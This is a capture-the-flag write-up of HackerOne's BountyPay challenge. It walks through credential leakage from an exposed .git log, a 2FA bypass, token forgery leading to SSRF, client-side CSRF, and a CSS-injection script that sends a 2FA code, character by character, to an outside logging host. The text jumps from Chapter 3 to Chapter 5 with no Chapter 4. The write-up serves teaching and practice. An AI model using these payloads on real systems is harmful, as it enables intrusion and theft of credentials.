activities.message:
{F860687}

## Foreword

This starts like any other fairy tale. The hero, aka me, was chilling after a long day of conquering web applications. He was scrolling Twitter to keep up with everything new in the infosec community.

In these kinds of stories, you all know what's next. Something unexpected happens that would change the hero forever.

This comes in the form of a tweet, at 8:39 PM in the hero's timezone, on a Friday.

{F860688}

At that moment, our protagonist knew that he had a worthy mission! A mission to deliver the bounties to all the hackers who did their job of protecting the safety of millions of internet users. **#TogetherWeHitHarder**

This write-up is for my beginner self. The one that was very overwhelmed with every resource on security, but didn't yet know how to approach a web application. It has all the details I would have liked to know when I started. I hope that it reaches hackers in the same position as I was a year ago and points them in the right direction.

## Chapter 1 - Reconnaissance-by-fire

It all starts with the policy and scope. I visited https://hackerone.com/h1-ctf to understand what I'm allowed to do.

{F860693}

The main target is a wildcard domain - `*.bountypay.h1ctf.com`. Anything on the out of scope part that would be included in this wildcard? Nope. Then we're good to go!

I proceeded to enumerate subdomains to understand the attack surface. For this task, we will use [findomain](https://github.com/Edu4rdSHL/findomain) because it's really fast in passive mode.

```bash
$ findomain -t bountypay.h1ctf.com

Target ==> bountypay.h1ctf.com

Searching in the CertSpotter API... 🔍
Searching in the Bufferover API... 🔍
Searching in the Crtsh database API... 🔍
Searching in the Sublist3r API... 🔍
Searching in the Spyse API... 🔍
Searching in the Urlscan.io API... 🔍
Searching in the AnubisDB API... 🔍
Searching in the Threatminer API... 🔍
Searching in the Virustotal API... 🔍
Searching in the Facebook API... 🔍
Searching in the Threatcrowd API... 🔍

api.bountypay.h1ctf.com
app.bountypay.h1ctf.com
software.bountypay.h1ctf.com
staff.bountypay.h1ctf.com
www.bountypay.h1ctf.com
bountypay.h1ctf.com

A total of 6 subdomains were found for domain bountypay.h1ctf.com 👽 in 1 second.⏲️

Good luck Hax0r 💀!
```

I think that's all the surface we need so far.

I started a directory brute force with [ffuf (best tool ever)](https://github.com/ffuf/ffuf) and [common.txt wordlist from SecLists](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/common.txt). I let this run in the background while I did my manual recon.

Usually, at this step, I would use [aquatone](https://github.com/michenriksen/aquatone) to grab screenshots of all domains. But in this case, I opened all of them one by one in my browser.

{F860691}

Let's start with **bountypay.h1ctf.com**. It's a basic front page with links to `app.bountypay.h1ctf.com` and `staff.bountypay.h1ctf.com`. Nothing much interesting here. The **www** subdomain at **www.bountypay.h1ctf.com** points to the same page.

{F860689}

The **app** subdomain at **app.bountypay.h1ctf.com** is a login page. I tried `admin:admin` for the kicks, but it failed.

{F860695}

The **staff** subdomain at **staff.bountypay.h1ctf.com** is a login page too. It presents something interesting right off the bat, which is the `template` parameter. Let's do some basic fuzzing.

Might this cause a Local File Inclusion / Disclosure vulnerability? We have `template=login`, let's try `template=./login`. But no luck.

Then I proceeded to do brute force the parameter to maybe disclose more templates.

```bash
$ ffuf -u 'https://staff.bountypay.h1ctf.com/?template=FUZZ' -w common.txt -ac

        /'___\  /'___\           / ___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v1.1.0-git
________________________________________________

 :: Method           : GET
 :: URL              : https://staff.bountypay.h1ctf.com/?template=FUZZ
 :: Follow redirects : false
 :: Calibration      : true
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403
 :: Filter           : Response words: 1
________________________________________________

admin                   [Status: 200, Size: 26, Words: 5, Lines: 1]
login                   [Status: 200, Size: 1348, Words: 337, Lines: 34]
:: Progress: [4652/4652] :: Job [1/1] :: 332 req/sec :: Duration: [0:00:14] :: Errors: 0 ::
```

Hmm, `admin` was found. What is there?

```bash
$ curl 'https://staff.bountypay.h1ctf.com/?template=admin' -i
HTTP/1.1 200 OK
Server: nginx/1.14.0 (Ubuntu)
Content-Type: text/html; charset=UTF-8
Connection: keep-alive

No Access to this resource
```

I wrote it in my notes and moved on to the next target.

{F860694}

This is an interesting index page at **software.bountypay.h1ctf.com**. We will get the results from the directory brute force in a bit, but for now, this gets noted. The things that make it special is not only the 401 but the special error "You do not have permission to access this server from **your IP Address**". Possibly a hint!

{F860690}

Last but not least is **api.bountypay.h1ctf.com**. The first thing I noticed on this page is the link on REST API. It points to `/redirect?url=https://www.google.com/search?q=REST+API`. Hmm, this might be an [Open Redirect](https://blog.detectify.com/2019/05/16/the-real-impact-of-an-open-redirect/).

Let's do some fuzzing. I tried to redirect to `hackerone.com`, only to be met by an error.

```bash
$ curl 'https://api.bountypay.h1ctf.com/redirect?url=https://www.hackerone.com/'
URL NOT FOUND IN WHITELIST
```

I tried a few more tricks, like using just `//domain.com/` without the protocol, or checking for subdomains. Then I figured that `*.bountypay.h1ctf.com` might be on the whitelist.

```bash
$ curl 'https://api.bountypay.h1ctf.com/redirect?url=https://api.bountypay.h1ctf.com/' -i
HTTP/1.1 302 Found
Server: nginx/1.14.0 (Ubuntu)
Content-Type: text/html; charset=UTF-8
Connection: keep-alive
Location: https://api.bountypay.h1ctf.com/
```

Good, good! This might be useful in a [SSRF (Server Side Forgery Request)](https://blog.detectify.com/2019/01/10/what-is-server-side-request-forgery-ssrf/) attack. I noted everything about I know about it for now and moved on because this is a Low Impact vulnerability and I need to learn about the attack surface of the app more in-depth before putting in the time for a proper bypass.

**Directory brute forcing** just finished. The only interesting thing that resulted from this is the `/.git/HEAD` on `app.bountypay.h1ctf.com`. Exposed `.git` folders are a common mistake and they usually lead to source code disclosure. You can read more about this particular issue in [this article from pentester.land](https://pentester.land/tutorials/2018/10/25/source-code-disclosure-via-exposed-git-folder.html).

{F860697}

My first thought when I saw it was to use a tool called [GitTools Dumper](https://github.com/internetwache/GitTools) to download the source code. But... umm. It didn't work. Maybe `/.git/config` can point us in the right direction?!

```bash
$ curl 'https://app.bountypay.h1ctf.com/.git/config'
[core]
	repositoryformatversion = 0
	filemode = true
	bare = false
	logallrefupdates = true
[remote "origin"]
	url = https://github.com/bounty-pay-code/request-logger.git
	fetch = +refs/heads/*:refs/remotes/origin/*
[branch "master"]
	remote = origin
	merge = refs/heads/master
```

Wow, wow, wow! That's a GitHub repository. Is it public? It is! Holy Moly! We have Source Code Leak. It seems to only contain one file - `logger.php`

{F860692}

This file is pointing to `bp_web_trace.log`. Maybe that file is exposed as well? Considering that the `.git` directory was exposed.

```bash
$ curl 'https://app.bountypay.h1ctf.com/bp_web_trace.log'
1588931909:eyJJUCI6IjE5Mi4xNjguMS4xIiwiVVJJIjoiXC8iLCJNRVRIT0QiOiJHRVQiLCJQQVJBTVMiOnsiR0VUIjpbXSwiUE9TVCI6W119fQ==
1588931919:eyJJUCI6IjE5Mi4xNjguMS4xIiwiVVJJIjoiXC8iLCJNRVRIT0QiOiJQT1NUIiwiUEFSQU1TIjp7IkdFVCI6W10sIlBPU1QiOnsidXNlcm5hbWUiOiJicmlhbi5vbGl2ZXIiLCJwYXNzd29yZCI6IlY3aDBpbnpYIn19fQ==
1588931928:eyJJUCI6IjE5Mi4xNjguMS4xIiwiVVJJIjoiXC8iLCJNRVRIT0QiOiJQT1NUIiwiUEFSQU1TIjp7IkdFVCI6W10sIlBPU1QiOnsidXNlcm5hbWUiOiJicmlhbi5vbGl2ZXIiLCJwYXNzd29yZCI6IlY3aDBpbnpYIiwiY2hhbGxlbmdlX2Fuc3dlciI6ImJEODNKazI3ZFEifX19
1588931945:eyJJUCI6IjE5Mi4xNjguMS4xIiwiVVJJIjoiXC9zdGF0ZW1lbnRzIiwiTUVUSE9EIjoiR0VUIiwiUEFSQU1TIjp7IkdFVCI6eyJtb250aCI6IjA0IiwieWVhciI6IjIwMjAifSwiUE9TVCI6W119fQ==
```

This looks like base64. I usually use [CyberChef](https://gchq.github.io/CyberChef/) to decode *almost* everything. After decoding, the logs above look like this:

```json
1588931909:{"IP":"192.168.1.1","URI":"\/","METHOD":"GET","PARAMS":{"GET":[],"POST":[]}}
1588931919:{"IP":"192.168.1.1","URI":"\/","METHOD":"POST","PARAMS":{"GET":[],"POST":{"username":"brian.oliver","password":"V7h0inzX"}}}
1588931928:{"IP":"192.168.1.1","URI":"\/","METHOD":"POST","PARAMS":{"GET":[],"POST":{"username":"brian.oliver","password":"V7h0inzX","challenge_answer":"bD83Jk27dQ"}}}
1588931945:{"IP":"192.168.1.1","URI":"\/statements","METHOD":"GET","PARAMS":{"GET":{"month":"04","year":"2020"},"POST":[]}}
```

It seems that we have the credentials for `brian.oliver`. Are they valid? Is this the end? What about Mårten?

It's time for some commercials! We'll be right back!

{F860684}

## Chapter 2 - Don't roll your own *anything*

Welcome back to another chapter of **Doing CTFs Without Sleep**!

I didn't yet mention anything about [Burp Suite](https://portswigger.net/burp). Well, it's the most wonderful hacking tool in the entire universe! If I would only have to pick one tool, this would be it. No joke!

I opened **Burp**, set up the scope to `bountypay`, then I checked the following **Response Modifications**: Unhide hidden form fields and Enable disabled form fields.

{F860702}

Then I opened my browser on https://app.bountypay.h1ctf.com/ and tried the following credentials:

```
Username: brian.oliver
Password: V7h0inzX
```

But a \*wild\* 2FA appears. In the logs, there was a possible answer for this: `bD83Jk27dQ`. It doesn't seem to work.

{F860696}

The next step would be to check that new field from the page. It has the name `challenge`, and our 2FA password has the input name `challenge_answer`, so they should be correlated somehow. How?

{F860703}

Rare Nahamsec has been spotted doing some proper trolling on Twitter.

Back to the challenge, this is the value of `challenge` field - `5ee8d386393ebbf7c8d0d4124bc78ed0`. It looks like an MD5. I tried to see if there's a match for it on the internet (via hash toolkit and other tools), but I had no luck.
What if the reverse is possible? Use any value as the answer and change the challenge to the corresponding MD5.

Let's try with the answer `a`. I used CyberChef to hash it -  `md5("a") = 0cc175b9c0f1b6a831c399e269772661`. And it worked, I was able to login as `brian.oliver`.

{F860701}

There's some new surface to take into consideration.

The page is simple, only has the **Load Transactions** bar which has some Javascript magic attached to it.

There is a new Javascript file at [/js/app.js](https://app.bountypay.h1ctf.com/js/app.js). Below is the important part of its content.

```js
$(".loadTxns").click(function() {
    let t = $('select[name="month"]').val(),
        e = $('select[name="year"]').val();
    $(".txn-panel").html("");
    $.get("/statements?month=" + t + "&year=" + e, function(t) {
        if (t.hasOwnProperty("data")) {
            // -- snip --
        } else alert("Invalid Response From The Server")
    });
});
```

The only things it seems to be doing is a request to `/statements` with the `month` and `year` selected by the user. Let's replay the request with the help of `curl` and my cookie. And because I already know the content is JSON, I will be using `jq` to beautify.

```bash
$ curl 'https://app.bountypay.h1ctf.com/statements?month=01&year=2020' -H 'Cookie: token=eyJhY2NvdW50X2lkIjoiRjhnSGlxU2RwSyIsImhhc2giOiJkZTIzNWJmZmQyM2RmNjk5NWFkNGUwOTMwYmFhYzFhMiJ9' | jq
{
  "url": "https://api.bountypay.h1ctf.com/api/accounts/F8gHiqSdpK/statements?month=01&year=2020",
  "data": "{\"description\":\"Transactions for 2020-01\",\"transactions\":[]}"
}
```

I did some fuzzing on the two parameters with special characters to observe interesting behavior, but nothing happened. The two parameters may be converted to numbers because if I try `01"'` as the month, it will be reflected as `month=01`.

Maybe new parameters? I put `ffuf` to work with a list from SecLists.

```bash
$ ffuf -u 'https://app.bountypay.h1ctf.com/statements?month=01&year=2020&FUZZ=test' -H 'Cookie: token=eyJhY2NvdW50X2lkIjoiRjhnSGlxU2RwSyIsImhhc2giOiJkZTIzNWJmZmQyM2RmNjk5NWFkNGUwOTMwYmFhYzFhMiJ9' -w ./burp-parameter-names.txt -fs 177 -mc all
year                    [Status: 400, Size: 31, Words: 5, Lines: 1]
month                   [Status: 400, Size: 31, Words: 5, Lines: 1]
```

Except for an error on using `year` or `month` with the value `test`, nothing special.

Maybe I can directly access that `api.bountypay` endpoint.

```bash
$ curl 'https://api.bountypay.h1ctf.com/api/accounts/F8gHiqSdpK/statements?month=01&year=2020' -i
HTTP/1.1 401 Unauthorized
Server: nginx/1.14.0 (Ubuntu)
Content-Type: application/json
Connection: keep-alive

["Missing or invalid Token"]
```

Of course, the next logical step was to try with the Cookie header or the Token as a header. Neither worked.

Hmm. Let's check the cookie. It looks custom. *And `eyJ` at the start usually means it's a JSON encoded with base64 - #l33tHackerTips.*

```json
{
  "account_id": "F8gHiqSdpK",
  "hash": "de235bffd23df6995ad4e0930baac1a2"
}
```

I don't know what the hash is yet, but I saw that Account ID before, reflected in the API request to `/statements`. It could be the same.

I played with it for a bit in the Burp Repeater, because it's really easy to do base64 transformations with the shortcuts: Encode with `CTRL + B`, Decode with `CTRL + Shift + B`.

The first thing I noticed is that if I change the `account_id` to `test`, the API request to `/statements` still works. Notice in the screenshot below that the URL reflects the new `account_id`.

{F860698}

Now, if I change the Account ID to `#` or `?`, we would be able to have the request for ourselves. No more suffix.

```json
{
  "url": "https://api.bountypay.h1ctf.com/api/accounts/F8gHiqSdpK#/statements?month=01&year=2020",
  "data": "{\"account_id\":\"F8gHiqSdpK\",\"owner\":\"Mr Brian Oliver\",\"company\":\"BountyPay Demo \"}"
}
```

This made me think that Path Traversal is also possible with `../`.

```json
{
  "url": "https://api.bountypay.h1ctf.com/api/accounts/../#/statements?month=01&year=2020",
  "data": "[\"Endpoint Not Found\"]"
}
```

I'm not very good at guessing paths, so the next logical step for me was to write a Python script for base64 transformation and pipe it to `ffuf` as a wordlist to brute force some directories.

```python
import base64
import sys

prefix = sys.argv[1] if len(sys.argv) > 1 else ''
with open('/dev/stdin') as f:
    for item in f:
        account_id = prefix + item.strip() + '#'
        token = '{"account_id":"%s","hash":"de235bffd23df6995ad4e0930baac1a2"}' % account_id
        token = base64.b64encode(token.encode('utf8')).decode('utf8')
        print(token)
```

For the same directory (with `./` as the prefix), it didn't find anything.

For the same the Account Id `./F8gHiqSdpK/`, it found only `https://api.bountypay.h1ctf.com/api/accounts/F8gHiqSdpK/statements`.

```bash
$ cat common.txt | python token-dirs.py '../' | ffuf -u 'https://app.bountypay.h1ctf.com/statements?month=01&year=2020' -H 'Cookie: token=FUZZ' -w - -fr 'Endpoint Not Found|404'
eyJhY2NvdW50X2lkIjoiLi4vc3RhZmYjIiwiaGFzaCI6ImRlMjM1YmZmZDIzZGY2OTk1YWQ0ZTA5MzBiYWFjMWEyIn0= [Status: 200, Size: 141, Words: 4, Lines: 1]
```

For one level depth `../`, it found `https://api.bountypay.h1ctf.com/api/staff`. It is blocked without some "token".

For two levels depth `../../`, it found `https://api.bountypay.h1ctf.com/redirect`. Wait, didn't I take a look at this a while ago? \*scrolling through notes intensifies\*. It is an endpoint that allows redirecting to `*.bountypay.h1ctf.com` and to `google.com/search`. I quickly remembered we have a weird subdomain at **software.bountypay.h1ctf.com** that might be interesting to check because of the **401 Not Authorized** error.

I tried it first from my perspective by visiting https://api.bountypay.h1ctf.com/redirect?url=https://software.bountypay.h1ctf.com/. And the redirect **works**!

```bash
$ curl -i 'https://api.bountypay.h1ctf.com/redirect?url=https://software.bountypay.h1ctf.com/'
HTTP/1.1 302 Found
Server: nginx/1.14.0 (Ubuntu)
Content-Type: text/html; charset=UTF-8
Location: https://software.bountypay.h1ctf.com/
```

Let's try `../../redirect?url=https://software.bountypay.h1ctf.com/` as `account_id`.

{F860699}

It magically **works**, because I can see **the title of the page** instead of that scary 401 error. Now what? It looks a bit like a login page, but I don't have an idea yet how to send POST requests with this Path Traversal to SSRF vulnerability.

While waiting for a better idea, I started a directory brute force process in the background.

```bash
$ cat common.txt | python token-dirs.py '../../redirect?url=https://software.bountypay.h1ctf.com/' | ffuf -u 'https://app.bountypay.h1ctf.com/statements?month=01&year=2020' -H 'Cookie: token=FUZZ' -w - -fr '404 Not Found'
eyJhY2NvdW50X2lkIjoiLi4vLi4vcmVkaXJlY3Q/dXJsPWh0dHBzOi8vc29mdHdhcmUuYm91bnR5cGF5LmgxY3RmLmNvbS9jc3MjIiwiaGFzaCI6ImRlMjM1YmZmZDIzZGY2OTk1YWQ0ZTA5MzBiYWFjMWEyIn0= [Status: 200, Size: 368, Words: 5, Lines: 1]
eyJhY2NvdW50X2lkIjoiLi4vLi4vcmVkaXJlY3Q/dXJsPWh0dHBzOi8vc29mdHdhcmUuYm91bnR5cGF5LmgxY3RmLmNvbS9pbWFnZXMjIiwiaGFzaCI6ImRlMjM1YmZmZDIzZGY2OTk1YWQ0ZTA5MzBiYWFjMWEyIn0= [Status: 200, Size: 371, Words: 5, Lines: 1]
eyJhY2NvdW50X2lkIjoiLi4vLi4vcmVkaXJlY3Q/dXJsPWh0dHBzOi8vc29mdHdhcmUuYm91bnR5cGF5LmgxY3RmLmNvbS9qcyMiLCJoYXNoIjoiZGUyMzViZmZkMjNkZjY5OTVhZDRlMDkzMGJhYWMxYTIifQ== [Status: 200, Size: 367, Words: 5, Lines: 1]
eyJhY2NvdW50X2lkIjoiLi4vLi4vcmVkaXJlY3Q/dXJsPWh0dHBzOi8vc29mdHdhcmUuYm91bnR5cGF5LmgxY3RmLmNvbS91cGxvYWRzIyIsImhhc2giOiJkZTIzNWJmZmQyM2RmNjk5NWFkNGUwOTMwYmFhYzFhMiJ9 [Status: 200, Size: 489, Words: 63, Lines: 1]
```

The first three of them are `css`, `images` and `js`, and they result in `403 Forbidden`. But the last one is **/uploads**. And it freakin' **works**.

{F860700}

Incredible! And I can access the `apk` directly at [https://software.bountypay.h1ctf.com/uploads/BountyPay.apk](https://software.bountypay.h1ctf.com/uploads/BountyPay.apk). No auth required!!!

But when I tried do download it, something went wrong. I was able to download only a small part of the file. I tried some shenanigans to maybe fix the archive or just get some information from it, but nothing would work.

It was already 11:50 PM, I had a long day so I went directly to sleep.

**Takeaways:** Don't roll your own Two-Factor Authentication library! Don't roll your own Secure Cookie library!

To be continued!

{F860683}

## Chapter 3 - The APK of Doom

It's 5:30 AM. I woke up naturally. Whenever I have something to do, I just wake up full of energy and ready to go at abnormal hours.

The first thing I did was to check Twitter. Maybe someone already solved it? Or maybe HackerOne posted a hint?

{F860706}

Hmm. I had problems with the "thing". Maybe he's directly referring to the `apk` download. *I already had hundreds of ideas on what to do about it because I was sure it's part of the challenge.*

I tried to download [it](https://software.bountypay.h1ctf.com/uploads/BountyPay.apk) again and it worked. Hip hip hurray!

Now decompile. For this one I usually do the following two things:

**1.** Decompile using `apktool` to view the resources (XML files, config, images) and the code in smali. More details on it in [their documentation](https://ibotpeaches.github.io/Apktool/documentation/).

```bash
$ apktool d BountyPay.apk
I: Using Apktool 2.4.1 on BountyPay.apk
I: Loading resource table...
I: Decoding AndroidManifest.xml with resources...
I: Regular manifest package...
I: Decoding file-resources...
I: Decoding values */* XMLs...
I: Baksmaling classes.dex...
I: Copying assets and libs...
I: Copying unknown files...
I: Copying original files...

$ ls BountyPay
original/  res/  smali/  unknown/  AndroidManifest.xml  apktool.yml
```

**2.** Decompile using `dex2jar` and `jd-cli`. These tools combined decompile an `apk` to Java. It's immensely helpful for Source Code Review.

To be honest, I picked up this trick from [an old presentation on bug bounty hunting from Arne Swinnen](https://www.arneswinnen.net/wp-content/uploads/2016/02/10-Interesting-Vulnerabilities-in-Instagram-Arne-Swinnen.pdf).

```bash
$ mkdir BountyPay-java
$ ./dex-tools/d2j-dex2jar.sh -o './BountyPay-java/dex2jar.jar' BountyPay.apk
dex2jar BountyPay.apk -> ./BountyPay-java/dex2jar.jar

$ java -jar ./jd-cmd/jd-cli.jar --outputDir './BountyPay-java/' './BountyPay-java/dex2jar.jar'
05:40:41.825 INFO  jd.cli.Main - Decompiling ./BountyPay-java/dex2jar.jar
-- snip --
05:40:46.636 INFO  jd.core.output.DirOutput - Finished with 4954 class file(s) and 0 resource file(s) written.

$ ls BountyPay-java
```

## Chapter 5 - Client-Side Surfing

It was almost 6 pm. Still on Saturday. I was really hoping I can solve this by Sunday.

I got the credentials for Sandra. Let's test them on https://staff.bountypay.h1ctf.com/

```
Username: sandra.allison
Password: s%3D8qB8zEpMnc*xsz7Yp5
```

They worked. I'm logged in. Before I do anything, I got to make sure I understand the attack surface really well. Here's a short clip of me clicking on everything in the application.

{F860716}

And below is the directory structure with every path discovered.

{F860712}

My primary instincts kicked in instantly when I saw the `url` parameter. The first thing I did was to send a request to `/admin/report?url=myurl`, where `myurl` was a bin from [requestbin.net](http://requestbin.net/). No pingback. What about DNSBin? Nothing.

What if I'm not interacting properly with the endpoint? Let's dig into [/js/website.js](https://staff.bountypay.h1ctf.com/js/website.js).

```js
$(".sendReport").click(function() {
    $.get("/admin/report?url=" + url, function() {
        alert("Report sent to admin team");
    });
    $("#myModal").modal("hide");
});
```

The report functionality sends a GET request to `/admin/report?url=[...]` with the variable `url`. That variable is not defined in the `website.js` file. It's actually defined on every page towards the end as a base64 of the current path and query. For example this one:

```html
<script>
    var url = 'Lz90ZW1wbGF0ZT10aWNrZXQmdGlja2V0X2lkPTM1ODI='; // == b64('/?template=ticket&ticket_id=3582')
</script>
<script src="/js/website.js"></script>
```

Ok, so I need base64 and an URL without protocol, hostname or port. Maybe the redirect trick from before? I didn't find any `/redirect` endpoints. Maybe full URL still works, but I didn't try it with base64? Nope, no pingback.

From my experience with **app.bountypay.h1ctf.com**, cookies hold magical stuff. The Session Cookie for this one was something like `c0lsdUVWbXlwYnp5L1VuMG[...]`. Really long cookie. I decoded it once with base64, it resulted in another base64. Decode it again, got some binary data. *Old tricks don't last.* Check the full token in [this CyberChef recipe](https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true)From_Base64('A-Za-z0-9%2B/%3D',true)&).

Then I started playing with the profile functionality. User controls two fields: `profile_name` and `profile_avatar`. I tried for XSS vulnerabilities or any other types of injections, but everything was sanitized except for space, 0-9A-Za-z. You might be correctly wondering how do I know this?

I set the profile name and profile avatar to ```test !"#$%&\'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\]^_`abcdefghijklmnopqrstuvwxyz{|}~``` and they both returned `test 0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz`.

To make things more readable, I changed both to `test test0`. I shifted my focus to the **ticket** page because if there's a Blind XSS or something, that's the only page that the admin can see the same as me. Noticed that everything is reflected as in the profile page (`[0-9A-Za-z ]+`). But something seems to be wrong with the avatar.

{F860714}

So the space character allows me to control the class of the avatar. Is there something exploitable here? I don't think so, no JS in CSS :(

Let's get deeper into [website.js](https://staff.bountypay.h1ctf.com/js/website.js). Below is a beautified version:

```js
$(".upgradeToAdmin").click(function() {
    let t = $('input[name="username"]').val();
    $.get("/admin/upgrade?username=" + t, function() {
        alert("User Upgraded to Admin");
    });
});

$(".tab").click(function() {
    $(".tab").removeClass("active");
    $(this).addClass("active");
    $("div.content").addClass("hidden");
    $("div.content-" + $(this).attr("data-target")).removeClass("hidden");
});
// -- snipped send report function --

if (location.hash.length > 0) {
    "#tab1" === location.hash && $(".tab1").trigger("click");
    "#tab2" === location.hash && $(".tab2").trigger("click");
    "#tab3" === location.hash && $(".tab3").trigger("click");
    "#tab4" === location.hash && $(".tab4").trigger("click");
}
```

It took me a while to see it. I've read the file multiple times. Take your time if you want to follow along.

We control the avatar class. We can abusively put `tab` and `upgradeToAdmin` in it, and trigger it with the hash. This is **"Client-Side" CSRF** vulnerability. You should read [this very good article](https://www.facebook.com/notes/facebook-bug-bounty/client-side-csrf/2056804174333798/) on this type of issues by [Facebook Bug Bounty](https://www.facebook.com/BugBounty/).

Let's impersonate an **attacker** exploiting this vulnerability. They can set the avatar to `tab1 upgradeToAdmin` (because spaces are allowed), use the ticket page because it's visible to the admin, add `#tab1` at the end and send it to the victim (aka admin). If the admin clicks on that link, the element with `tab1` will automagically be clicked, which means the class `upgradeToAdmin` was also clicked. All of this from the context of the admin, who should have access to upgrade other users to admin.

{F860715}

Ok, it sounded 100% legit. Then, why is the request sent to `/admin/upgrade?username=undefined`. I think we forgot one small little thing. How am I going to set the username? Because the **upgradeToAdmin** functionality gets the username from an input tag with that name. I really, really hoped there would be some hidden element on that ticket page. But nope.

Where did we see an input tag for username? Maybe the profile page? Checked, no input tag. There sure was one on the login page. Can I access the login page even though I have a session? Yes, it's available. How do I set something in the username? Maybe it's reflected from the query? It's quite a frequent thing.

```html
$ curl 'https://staff.bountypay.h1ctf.com/?template=login&username=sandra.allison'
<!-- snip -->
<div class="panel-body">
    <div style="margin-top:7px"><label>Username:</label></div>
    <div><input name="username" class="form-control" value="sandra.allison"></div>
    <div style="margin-top:7px"><label>Password:</label></div>
    <div><input name="password" type="password" class="form-control"></div>
</div>
<!-- snip -->
```

Yas! It's reflected exactly where I need it to be. I tried going off script and trying some XSS payloads, but it seems only the alphabetical characters and the dot character are allowed on this input tag. Using a Regular Expression, the filter would be `^[a-z.]+$`.

The only problem is that the login page doesn't have the `/js/website.js` file included. Is there a way to combine the two templates?

After some attempts, I discovered that I can manipulate the page to render two templates at once using the templates as arrays - `?template[]=login&template[]=ticket`.

I attempted to exploit myself with the following URL `https://staff.bountypay.h1ctf.com/?template[]=login&username=sandra.allison&template[]=ticket&ticket_id=3582#tab1`. And the attempt was successful as it can be seen in the screenshot below, the request was sent to `/admin/upgrade?username=sandra.allison`. There's still the `401 Not Authorized` problem, but that should work with admin permissions.

{F860713}

And for my next magic trick, I will require an assistant. **Admin** would you like to help me out? I'm so glad you offered!

I expect that the admin at `/admin/report` is running Javascript. We will know soon enough, won't we? I encoded my special path with base64 and accessed the following URL [https://staff.bountypay.h1ctf.com/admin/report?url=Lz90ZW1wbGF0ZVtdPWxvZ2luJn[...]](https://staff.bountypay.h1ctf.com/admin/report?url=Lz90ZW1wbGF0ZVtdPWxvZ2luJnVzZXJuYW1lPXNhbmRyYS5hbGxpc29uJnRlbXBsYXRlW109dGlja2V0JnRpY2tldF9pZD0zNTgyI3RhYjE%3D). {F860717}

It's asking for a 2FA code. Maybe the trick from before worked with MD5? Nopes.

As shown in the video, in the first step there's an URL to a CSS file. It looks out of place because it was a hidden input (Burp FTW!). By default, it points to [/css/uni_2fa_style.css](https://www.bountypay.h1ctf.com/css/uni_2fa_style.css), which is a basic CSS file.

If I use my URL, maybe I can get a pingback? Let's try [requestbin.net](http://requestbin.net/). No ping. There might be a problem with non-secure HTTP. Let's try [ssrftest.com](https://ssrftest.com/) by [@daeken](https://twitter.com/daeken). We got a hit!

```http
GET https://ssrftest.com/x/XWdcn HTTP/1.1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/83.0.4103.61 HeadlessChrome/83.0.4103.61 Safari/537.36
Connection: Keep-Alive
Sec-Fetch-Dest: style
X-Forwarded-Proto: https
Sec-Fetch-Mode: no-cors
Host: ssrftest.com
Sec-Fetch-Site: cross-site
Accept: text/css,*/*;q=0.1
X-Forwarded-For: 3.21.98.146
Accept-Language: en-US
Accept-Encoding: gzip
```

I always check the IP address to confirm it's not me who clicked on the payload. I ran the `dig` command on `app.bountypay.h1ctf.com` and it points to the same IP address as the `X-Forwarded-For` header above. Gotcha!

My theory is that the CSS is inserted on the 2FA page and loaded in a Headless Browser. In a real-life scenario, the victim would be clicking on the 2FA page they just received via email / SMS.

I knew a bit about CSS Injection but never encountered it before. [Here](https://medium.com/bugbountywriteup/exfiltration-via-css-injection-4e999f63097d)'s a quick read about the subject.

I did some recon on the page. I didn't even know the name of the input field. Or if the input field even exists. Let's do some CSS magic to exfiltrate the number of inputs.

```css
input:nth-child(1) {
    background: url('https://ssrftest.com/target/log?link=XWdcn&data=input1');
}
/* --snip-- */
input:nth-child(10) {
    background: url('https://ssrftest.com/target/log?link=XWdcn&data=input10');
}
```

I wrote the CSS file above on my VPS (`https` is required for this to work). And waited for log messages on my SSRFTest instance... I got 7 hits back, which means there are **7 input fields**.

Let's make this easier. There was a tool from [@d0nutptr](https://twitter.com/d0nutptr) I've been meaning to try for a while. It comes with a [very good writeup](https://medium.com/@d0nut/better-exfiltration-via-html-injection-31c72a2dae8b). I installed [sic](https://github.com/d0nutptr/sic) on the VPS and played with it for a bit, only to realize it would only work if the CSS is included via `@import` inside a `style` tag. It doesn't work if it's included with the `link` tag...

Back to the drawing board. Somewhere around this moment that I realized the 2FA answer on my page has a max length attribute of 7 characters. And the 2FA page has 7 input fields. What if there's one character per field? Wrote a quick Python script to generate all cases and exfiltrate (in order).

```python
template = """
    input:nth-child(%d)[value^=%s] {
        background: url("https://ssrftest.com/target/log?link=XWdcn&data=%d%s");
    }
"""
charset = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_'
for k in range(1, 8):
    for c in charset:
        print(template % (k, c, k, c))
```

I copied the CSS file to my VPS and sent the link in the payment process. And it worked. Below are the logs from SSRFTest:

| Date | Message |
| ---- | :--------: |
| 2020-05-30 20:25:02.935345 | 7T |
| 2020-05-30 20:25:02.916710 | 6w |
| 2020-05-30 20:25:02.914142 | 5o |
| 2020-05-30 20:25:02.910506 | 4A |
| 2020-05-30 20:25:02.906665 | 2Y |
| 2020-05-30 20:25:02.902074 | 1A |
| 2020-05-30 20:25:02.899542 | 3f |

Fast, fast, fast! Copy logs, sort them, get the code, fill the 2FA answer and it worked! Finally! We got the FLAG! `^FLAG^736c635d8842751b8aafa556154eb9f3$FLAG$`

{F860718}

It was about 8:33 PM when I submitted the **FLAG**. I took a well-deserved break for the rest of the weekend.

The hero's journey ends here. He goes back home where everything is the way it was. But nothing will ever be the same again!

## Finish Line

I would like to send thanks to the organizers. The challenges were really great and I appreciate the effort put into this puzzle. I had a lot of fun because I had the opportunity to play around with a few bug classes that I don't normally encounter.

